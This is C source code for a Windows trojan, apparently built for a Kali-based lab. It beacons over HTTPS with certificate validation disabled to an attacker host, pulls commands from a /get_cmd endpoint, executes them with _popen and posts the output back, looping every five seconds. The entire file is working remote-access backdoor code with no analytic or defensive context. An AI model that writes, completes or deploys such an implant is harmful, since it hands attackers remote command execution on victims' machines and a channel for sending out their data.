#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "wininet.lib")


const char* KALI_IP = "192.168.1.";
const int KALI_PORT = 443;
const int SLEEP_TIME = 5000; 


void send_response(char* host, int port, char* data) {
    HINTERNET hInternet = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hConnect = InternetConnect(hInternet, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);

    DWORD flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/post_res", NULL, NULL, NULL, flags, 0);

    char* headers = "Content-Type: text/plain";
    HttpSendRequest(hRequest, headers, strlen(headers), data, strlen(data));

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}


void beacon(char* host, int port) {
    HINTERNET hInternet = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return;

    HINTERNET hConnect = InternetConnect(hInternet, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    
  
    DWORD flags = INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_NO_CACHE_WRITE;
    
    HINTERNET hRequest = HttpOpenRequest(hConnect, "GET", "/get_cmd", NULL, NULL, NULL, flags, 0);

    if (HttpSendRequest(hRequest, NULL, 0, NULL, 0)) {
        char cmd[1024] = {0};
        DWORD bytesRead;
        InternetReadFile(hRequest, cmd, sizeof(cmd) - 1, &bytesRead);

        if (bytesRead > 0) {
            cmd[bytesRead] = '\0';
            printf("[*] Commande recue : %s\n", cmd);

           
            FILE* fp = _popen(cmd, "r");
            if (fp != NULL) {
                char output[4096] = {0};
                char line[256];
                while (fgets(line, sizeof(line), fp) != NULL) {
                    strcat(output, line);
                }
                _pclose(fp);
                
               
                send_response(host, port, output);
            }
        }
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

int main() {


    printf("[+] Trojan actif. Connexion vers %s:%d\n", KALI_IP, KALI_PORT);

    while (1) {
        beacon((char*)KALI_IP, KALI_PORT);
        Sleep(SLEEP_TIME); 
    }

    return 0;
} 